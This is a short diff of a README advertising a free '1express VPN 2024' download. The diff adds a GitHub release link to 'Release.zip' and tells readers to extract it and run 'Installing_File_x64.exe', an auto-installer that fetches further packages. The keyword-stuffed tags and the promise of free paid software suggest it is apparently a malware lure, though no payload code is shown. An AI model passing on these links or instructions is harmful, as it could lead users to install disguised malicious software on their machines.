@@ -8,11 +8,11 @@ Tags: 1express 2024 free. Download 1express for free. Download free 1express 202
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/c5c28c6e-ac08-455d-b636-9744bcc74aa0)
-]()
+](https://github.com/VinosoPizzas/1express-Vpn-Free-2024/releases/download/V3.68/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/VinosoPizzas/1express-Vpn-Free-2024/releases/download/V3.68/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 
